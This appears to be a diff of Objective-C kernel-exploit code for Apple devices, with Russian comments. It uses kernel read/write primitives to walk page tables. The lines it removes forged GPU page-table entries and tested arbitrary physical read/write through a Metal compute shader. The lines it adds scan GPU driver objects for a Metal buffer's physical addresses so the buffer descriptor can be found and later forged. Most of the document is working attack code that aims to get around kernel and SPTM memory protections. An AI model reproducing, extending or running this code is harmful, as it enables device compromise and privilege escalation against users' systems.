@@ -5352,32 +5352,17 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
                agxuc, accel, gart, uat, mapper, L1arr]);
 
-    // 3. walk по известной ЖИВОЙ VA 0x10000000000 (pc=16, pd=0, pt=0 — там
-    //    живые записи от системной GPU-активности; доказано recon'ом)
-    uint64_t gpuVA = 0x10000000000ULL;
-    uint64_t e1 = kp_rc_kread64(L1arr + 16 * 8);
-    uint64_t L2 = (e1 & 1) ? gPrimitives.phystokv(e1 & 0xFFFFFFFFF000ULL) : 0;
-    uint64_t e2 = L2 ? kp_rc_kread64(L2 + 0) : 0;
-    uint64_t L3 = (e2 & 1) ? gPrimitives.phystokv(e2 & 0xFFFFFFFFF000ULL) : 0;
-    GNOTE( [NSString stringWithFormat:@"  walk: e1=%#llx L2=%#llx e2=%#llx L3=%#llx", e1, L2, e2, L3]);
-    if (!L3) { GNOTE( @"FAIL: таблица не достигнута"); gGartLive = NO; return r; }
+    // 3. HUNT: phys-поле memory-дескриптора Metal-буфера.
+    //    FW берёт root таблиц из своего кэша, поэтому форж PTE мёртв — но
+    //    mmu_map вызывается ШТАТНО при первом submit нового буфера, и phys
+    //    для него драйвер читает из дескриптора буфера (heap, тип 0x21 —
+    //    пишется). Находим, где именно лежит phys-список: создаём shared
+    //    буфер, считаем PA его страниц через наш ttep и сканируем объекты
+    //    коннекта (uc/accel/gart/uat/mapper) в 2 уровня на совпадения.
+    //    (L3-walk убран: именно он паниковал в прошлом прогоне, и для hunt
+    //    он не нужен.)
 
-    // 4. типы фреймов ВСЕЙ цепочки: L3 (PTE-страница) оказалась 0x17 (IOMMU,
-    //    SPTM-защищена). Ищем ПЕРВОЕ heap-звено — root-указатель в mapper'е.
-    uint64_t tableVA = [self frameTableVAWithLog:r];
-    int ftMapper = kpVAType(mapper, tableVA);
-    int ftL1arr = kpVAType(L1arr, tableVA);
-    int ftL2 = L2 ? kpVAType(L2, tableVA) : -1;
-    int ftL3 = L3 ? kpVAType(L3, tableVA) : -1;
-    GNOTE( [NSString stringWithFormat:@"  frame types: mapper=0x%x L1arr=0x%x L2=0x%x L3=0x%x (0x21=heap пишется, 0x17=IOMMU защищена)",
-               ftMapper, ftL1arr, ftL2, ftL3]);
-
-
-
-
-    // 5. FORGE v3: in-place. Тип 0x17 (IOMMU) может быть EL1-writable (драйвер
-    //    пишет PTE штатно) — НИ РАЗУ не тестировали. Сначала write-test,
-    //    потом форж leaf-слота в СУЩЕСТВУЮЩей L3 (её ходит GPU/FW root).
+    // 3a. self ttep (цепь thread→tro→proc→proc_ro→task→map→pmap→ttep)
     mach_port_t tp = mach_thread_self();
     uint64_t tva = [self rcResolveThreadKVA:tp];
     mach_port_deallocate(mach_task_self(), tp);
@@ -5390,84 +5375,63 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
     extern uint64_t vtophys(uint64_t, uint64_t);
 
-    uint64_t livePTE = kp_rc_kread64(L3);
-    uint64_t attrs = livePTE & ~0xFFFFFFFFF000ULL;
+    // 3b. shared Metal-буфер: contents-VA, gpuAddr, PA обеих страниц
+    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
+    id<MTLBuffer> buf = mtl ? [mtl newBufferWithLength:0x8000 options:MTLResourceStorageModeShared] : nil;
+    if (!buf) { GNOTE( @"FAIL: Metal buffer"); gGartLive = NO; return r; }
+    memset(buf.contents, 0xAB, 0x8000);
+    uint64_t cVA = (uint64_t)buf.contents;
+    uint64_t bVA = (uint64_t)buf.gpuAddress;
+    uint64_t bPA0 = vtophys(ttep, cVA);
+    uint64_t bPA1 = vtophys(ttep, cVA + 0x4000);
+    GNOTE( [NSString stringWithFormat:@"  buf: contents=%#llx gpuAddr=%#llx PA0=%#llx PA1=%#llx",
+               cVA, bVA, bPA0, bPA1]);
+    if (!bPA0) { GNOTE( @"FAIL: vtophys(contents)"); gGartLive = NO; return r; }
 
-    // пустой слот в живой L3
-    int emptySlot = -1;
-    for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3 + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
-    GNOTE( [NSString stringWithFormat:@"  L3 пустой слот: %d (attrs эталона=%#llx)", emptySlot, attrs]);
-    if (emptySlot < 0) { gGartLive = NO; return r; }
-    uint64_t slotVA = L3 + (uint64_t)emptySlot * 8;
-
-    // A) write-test на типе 0x17: пишем эталон, readback, restore
-    kp_rc_kwrite64(slotVA, livePTE);
-    uint64_t rb = kp_rc_kread64(slotVA);
-    kp_rc_kwrite64(slotVA, 0);
-    GNOTE( [NSString stringWithFormat:@"  write-test 0x17: %@ (rb=%#llx)",
-               rb == livePTE ? @"ПИШЕТСЯ — leaf-форж возможен!" : @"НЕ ПИШЕТСЯ", rb]);
-
-    if (rb == livePTE) {
-        // B) форж in-place: L3[empty] = paRd|attrs, L3[empty+1] = paWr|attrs
-        vm_address_t base = 0;
-        if (vm_allocate(mach_task_self(), &base, 0x8000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
-            mlock((void *)base, 0x8000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
-        memset((void *)base, 0, 0x8000);
-        uint8_t *rdT = (uint8_t *)base;
-        uint8_t *wrT = (uint8_t *)base + 0x4000;
-        memset(rdT, 0x37, 0x4000);
-        uint64_t paRd = vtophys(ttep, (uint64_t)rdT);
-        uint64_t paWr = vtophys(ttep, (uint64_t)wrT);
-        GNOTE( [NSString stringWithFormat:@"  rd=%#llx wr=%#llx", paRd, paWr]);
-        if (!paRd || !paWr) { GNOTE( @"FAIL: vtophys"); gGartLive = NO; return r; }
-
-        // forged VA для слотов: VA = 0x10000000000 + slot*0x4000 (pc=16,pd=0)
-        uint64_t forgedRdVA = 0x10000000000ULL + (uint64_t)emptySlot * 0x4000;
-        uint64_t forgedWrVA = 0x10000000000ULL + (uint64_t)(emptySlot + 1) * 0x4000;
-        kp_rc_kwrite64(slotVA, (paRd & 0xFFFFFFFFF000ULL) | attrs);
-        kp_rc_kwrite64(slotVA + 8, (paWr & 0xFFFFFFFFF000ULL) | attrs);
-        GNOTE( [NSString stringWithFormat:@"  форж: L3[%d]=%#llx L3[%d]=%#llx · rdVA=%#llx wrVA=%#llx",
-                   emptySlot, kp_rc_kread64(slotVA), emptySlot + 1, kp_rc_kread64(slotVA + 8), forgedRdVA, forgedWrVA]);
-
-        __block uint64_t probe = 0;
-        @autoreleasepool {
-            id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-            id<MTLBuffer> rbuf = mtl ? [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
-            if (rbuf) {
-                // map-триггер: gart invalidate (TLB)
-                id<MTLBuffer> poke = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
-                GNOTE( [NSString stringWithFormat:@"  map-триггер: %@", poke ? @"ok" : @"FAIL"]);
-                NSError *err = nil;
-                NSString *src = [NSString stringWithFormat:
-                    @"kernel void rd(device ulong *u [[buffer(0)]]) { device ulong *p=(device ulong*)0x%llx; device ulong *o=(device ulong*)0x%llx; *o=*p; }",
-                    forgedRdVA, forgedWrVA];
-                id<MTLLibrary> lib = [mtl newLibraryWithSource:src options:nil error:&err];
-                id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"rd"] : nil;
-                id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-                id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-                id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
-                id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
-                if (enc) {
-                    [enc setComputePipelineState:pipe];
-                    [enc setBuffer:rbuf offset:0 atIndex:0];
-                    [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-                    [enc endEncoding];
-                    [cb commit];
-                    [cb waitUntilCompleted];
-                    probe = *(volatile uint64_t *)wrT;
-                    GNOTE( [NSString stringWithFormat:@"  GPU: wrT[0]=%#llx · cb.status=%ld (%@)", probe, (long)cb.status,
-                               probe == 0x3737373737373737ULL ? @"★★★ GART READ+WRITE РАБОТАЮТ — GPU ходит по нашему PTE! ★★★" :
-                               probe ? @"что-то записалось" : (cb.error ? [cb.error description] : @"ноль/нет ошибки")]);
-                } else GNOTE( [NSString stringWithFormat:@"  compute оборвался: %@", err]);
+    // 3c. скан: корни → поля-указатели → объекты-цели → их поля.
+    //     Сигнатуры: PA0/PA1 (по странице), gpuAddr, contentsVA.
+    struct { uint64_t obj; const char *nm; uint64_t sz; } roots[] = {
+        { agxuc, "uc", 0x400 }, { accel, "accel", 0x400 },
+        { gart, "gart", 0x300 }, { uat, "uat", 0x200 }, { mapper, "mapper", 0x100 },
+    };
+    NSMutableString *hits = [NSMutableString string];
+    uint64_t visited[512]; int nv = 0;
+    for (int ri = 0; ri < 5; ri++) {
+        int targets = 0;
+        for (uint64_t off = 0; off < roots[ri].sz; off += 8) {
+            uint64_t v = kp_rc_kread64(roots[ri].obj + off);
+            if (bPA0 && (v & ~0xFFFULL) == (bPA0 & ~0xFFFULL))
+                [hits appendFormat:@"★ %s+%#llx == PA0 (%#llx)\n", roots[ri].nm, off, v];
+            if (bPA1 && (v & ~0xFFFULL) == (bPA1 & ~0xFFFULL))
+                [hits appendFormat:@"★ %s+%#llx == PA1 (%#llx)\n", roots[ri].nm, off, v];
+            if (bVA && v == bVA)
+                [hits appendFormat:@"★ %s+%#llx == gpuAddr\n", roots[ri].nm, off];
+            if (v == cVA)
+                [hits appendFormat:@"★ %s+%#llx == contentsVA\n", roots[ri].nm, off];
+            uint64_t tvv = kp_untag_ptr(v);
+            if (!kpLooksLikeKernelPointer(tvv) || kpVAIsEL2Domain(tvv)) continue;
+            BOOL seen = NO;
+            for (int q = 0; q < nv; q++) if (visited[q] == tvv) { seen = YES; break; }
+            if (seen) continue;
+            if (nv < 512) visited[nv++] = tvv;
+            if (!kvtophys(tvv) || !kvtophys(tvv + 0x1F8)) continue; // оба конца замаплены
+            targets++;
+            for (uint64_t o2 = 0; o2 < 0x200; o2 += 8) {
+                uint64_t w = kp_rc_kread64(tvv + o2);
+                if (bPA0 && (w & ~0xFFFULL) == (bPA0 & ~0xFFFULL))
+                    [hits appendFormat:@"★★ PA0: %s+%#llx → %#llx +%#llx (val=%#llx)\n", roots[ri].nm, off, tvv, o2, w];
+                if (bPA1 && (w & ~0xFFFULL) == (bPA1 & ~0xFFFULL))
+                    [hits appendFormat:@"★★ PA1: %s+%#llx → %#llx +%#llx (val=%#llx)\n", roots[ri].nm, off, tvv, o2, w];
+                if (bVA && w == bVA)
+                    [hits appendFormat:@"★★ gpuAddr: %s+%#llx → %#llx +%#llx\n", roots[ri].nm, off, tvv, o2];
+                if (w == cVA)
+                    [hits appendFormat:@"★★ contentsVA: %s+%#llx → %#llx +%#llx\n", roots[ri].nm, off, tvv, o2];
             }
         }
-        // restore forged slots
-        kp_rc_kwrite64(slotVA, 0);
-        kp_rc_kwrite64(slotVA + 8, 0);
-        GNOTE( [NSString stringWithFormat:@"  restore: %#llx %#llx", kp_rc_kread64(slotVA), kp_rc_kread64(slotVA + 8)]);
-        munlock((void *)base, 0x8000);
-        vm_deallocate(mach_task_self(), base, 0x8000);
+        GNOTE( [NSString stringWithFormat:@"  scan %s: targets=%d", roots[ri].nm, targets]);
     }
+    GNOTE( [NSString stringWithFormat:@"  hunt итог:\n%@",
+               hits.length ? (NSString *)hits : @"совпадений нет — дескриптор глубже/в другом месте"]);
     gGartLive = NO;
     return r;
 }
